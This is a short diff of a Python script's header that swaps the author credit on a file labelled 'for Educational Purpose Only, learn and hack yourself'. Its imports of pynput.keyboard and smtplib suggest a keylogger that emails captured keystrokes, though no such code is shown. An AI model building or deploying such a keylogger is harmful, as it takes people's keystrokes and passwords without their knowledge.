@@ -1,5 +1,5 @@
 """ The code is developed for Educational Purpose Only , learn and hack yourself
-                      --> BY HACK WITH ROHIT TAMIL"""
+                      --> BY SURYA"""
 
 import pynput.keyboard
 import smtplib
